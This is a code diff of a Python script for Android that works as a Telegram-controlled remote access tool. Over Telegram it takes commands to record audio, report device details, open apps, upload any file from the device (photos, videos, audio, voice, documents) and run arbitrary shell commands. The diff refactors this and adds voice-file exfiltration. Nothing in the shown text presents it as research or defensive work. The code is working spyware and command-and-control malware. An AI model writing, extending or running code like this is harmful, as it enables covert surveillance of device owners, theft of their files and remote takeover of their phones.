@@ -1,4 +1,4 @@
-import time,subprocess,requests,os,platform,sys,threading
+import time,subprocess,requests,os,platform,threading
 from jnius import autoclass
 
 def send_message(message):
@@ -39,15 +39,17 @@ def send_document(path,caption):
 
 def get_update(offset):
     try:
-        result = requests.get(f'https://api.telegram.org/bot{bot_token}/getUpdates',params={'offset':offset} if offset else {},timeout=5)
-        return {'ok':True,'result':result.json()}
+        result = requests.get(f'https://api.telegram.org/bot{bot_token}/getUpdates',params={'offset':offset} if offset else {},timeout=5).json()
+        if not result['ok']: return {'ok':False,'result':result['description']}
+        if not result['result']: return {'ok':False,'result':result['result']}
+        return {'ok':True,'result':result['result'][-1]}
     except Exception as error: return {'ok':False,'result':error}
 
 def internet():
     try:
         result = requests.get('https://www.google.com',timeout=3)
-        return result.status_code == 200
-    except Exception as error: return False
+        return {'ok':result.status_code == 200,'result':result.status_code}
+    except Exception as error: return {'ok':False,'result':error}
 
 def start_recording(sec=10):
     try:
@@ -102,37 +104,48 @@ def open_app(package_name):
 def gen_response(cmd):
     try:
         parts = cmd.strip().split()
-        if not parts: return {'result':f'*status:* `command not given`','type':'message'}
+        if not parts: return f'Command Not Given: `{cmd}`'
         cmdlen = len(parts)
         main = parts[0]
-        if cmdlen == 1 and main.lower() == 'active': return {'result':f'`{device}` is active','type':'message'}
-        elif cmdlen == 1 and main.lower() == 'sysinfo': return {'result':f'*Software*\n\nsystem: `{platform.system()}`\nrelease: `{platform.release()}`\nversion: `{platform.version()}`\nmachine: `{platform.machine()}`\n\n*Hardware*\n\nbrand: `{subprocess.getoutput("getprop ro.product.brand")}`\ndevice: `{subprocess.getoutput("getprop ro.product.device")}`\nandroid: `{subprocess.getoutput("getprop ro.build.version.release")}`\nmanufacturer: `{subprocess.getoutput("getprop ro.product.manufacturer")}`','type':'message'}
+        if cmdlen == 1 and main.lower() == 'active': return f'`{device}` is active'
+        elif cmdlen == 1 and main.lower() == 'sysinfo': return f'*Software*\n\nsystem: `{platform.system()}`\nrelease: `{platform.release()}`\nversion: `{platform.version()}`\nmachine: `{platform.machine()}`\n\n*Hardware*\n\nbrand: `{subprocess.getoutput("getprop ro.product.brand")}`\ndevice: `{subprocess.getoutput("getprop ro.product.device")}`\nandroid: `{subprocess.getoutput("getprop ro.build.version.release")}`\nmanufacturer: `{subprocess.getoutput("getprop ro.product.manufacturer")}`'
         elif cmdlen == 3 and main.lower() == 'start':
             if parts[1] == 'record':
                 threading.Thread(target=start_recording,args=(int(parts[2]),),daemon=True).start()
-                return {'result':f'`{parts[1]}` request sended','type':'message'}
+                return f'`{parts[1]}` request sended'
             elif parts[1] == 'go_home':
                 threading.Thread(target=go_home,daemon=True).start()
-                return {'result':f'`{parts[1]}` request sended','type':'message'}
+                return f'`{parts[1]}` request sended'
             elif parts[1] == 'app':
                 threading.Thread(target=open_app,args=(parts[2],),daemon=True).start()
-                return {'result':f'`{parts[1]}` request sended','type':'message'}
-            else: return {'result':f'Invalid Option For `{parts[1]}`','type':'message'}
+                return f'`{parts[1]}` request sended'
+            else: return f'Invalid Option For `{parts[0]}`'
         elif cmdlen == 3 and main.lower() == 'send':
-            if not os.path.exists(parts[2]): return {'result':f'*status:* path not found `{parts[2]}`','type':'message'}
+            if not os.path.exists(parts[2]): return f'Path Not Found `{parts[2]}`'
             file_details = subprocess.getoutput(f'stat {parts[2]}')
-            if parts[1] == 'photo': return {'result':{'file':parts[2],'caption':file_details},'type':'photo'}
-            elif parts[1] == 'video': return {'result':{'file':parts[2],'caption':file_details},'type':'video'}
-            elif parts[1] == 'audio': return {'result':{'file':parts[2],'caption':file_details},'type':'audio'}
-            elif parts[1] == 'document': return {'result':{'file':parts[2],'caption':file_details},'type':'document'}
-            else: return {'result':f'*status:* invalid option for `send`','type':'message'}
+            if parts[1] == 'photo':
+                send_photo(parts[2],file_details)
+                return f'`{parts[1]}` requests sended'
+            elif parts[1] == 'video':
+                send_video(parts[2],file_details)
+                return f'`{parts[1]}` requests sended'
+            elif parts[1] == 'audio':
+                send_audio(parts[2],file_details)
+                return f'`{parts[1]}` requests sended'
+            elif parts[1] == 'voice':
+                send_voice(parts[2],file_details)
+                return f'`{parts[1]}` requests sended'
+            elif parts[1] == 'document':
+                send_document(parts[2],file_details)
+                return f'`{parts[1]}` requests sended'
+            else: return f'Invalid Option For `{parts[0]}`'
         elif cmdlen > 1 and main == ':':
             result = subprocess.run(parts[1:],capture_output=True,text=True,timeout=5)
-            if result.stderr: return {'result':f'```executing(error)\n{result.stderr}```','type':'message'}
-            if result.stdout: return {'result':f'```executing(result)\n{result.stdout}```','type':'message'}
-            return {'result':'```executing(result)\nexecuted```','type':'message'}
-        else: return {'result':f'*status:* invalid `{cmd}`','type':'message'}
-    except Exception as error: return {'result':f'*error:* `{error}`','type':'message'}
+            if result.stderr: return f'```Executing(err)\n{result.stderr}```'
+            if result.stdout: return f'```Executing(res)\n{result.stdout}```'
+            return '```Executing(res)\nExecuted```'
+        else: return f'Invalid `{cmd}`'
+    except Exception as error: return f'*Error:* `{error}`'
 
 count = 0
 seen_id = []
@@ -146,30 +159,21 @@ print('root_key:',root_key,'\n\nrunning....\n')
 
 while True:
     try:
-        if not internet():
+        if not internet()['ok']:
             print('waiting for connection...')
             while True:
-                result = internet()
+                result = internet()['ok']
                 if result:
                     if root_user: send_message(f'`{device}` back to connection')
                     break
                 time.sleep(0.5)
             print('connected\n')
-        update = get_update(offset)
-        if not update['ok']:
-            print('update error:',update['result'],'\n')
+        new_update = get_update(offset)
+        if not new_update['ok']:
+            print('get update:',new_update['result'])
             time.sleep(0.5)
             continue
-        update = update['result']
-        if not update['ok']:
-            print('api error:',update['description'],'\n')
-            time.sleep(0.5)
-            continue
-        update = update['result']
-        if not update:
-            time.sleep(0.5)
-            continue
-        update = update[-1]
+        update = new_update['result']
         update_id = update['update_id']
         offset = update_id+1
         if update_id in seen_id or count == 0:
@@ -209,12 +213,7 @@ while True:
             count += 1
             continue
         response = gen_response(message)
-        if response['type'] == 'message': print('message send:',send_message(response['result']),'\n')
-        elif response['type'] == 'photo': print('send photo:',send_photo(response['result']['file'],response['result']['caption']),'\n')
-        elif response['type'] == 'video': print('send video:',send_video(response['result']['file'],response['result']['caption']),'\n')
-        elif response['type'] == 'audio': print('send audio:',send_audio(response['result']['file'],response['result']['caption']),'\n')
-        elif response['type'] == 'document': print('send document:',send_document(response['result']['file'],response['result']['caption']),'\n')
-        else: print('unknown send function called:',response['type'])
+        print(send_message(response))
         seen_id.append(update_id)
         time.sleep(0.5)
         count += 1
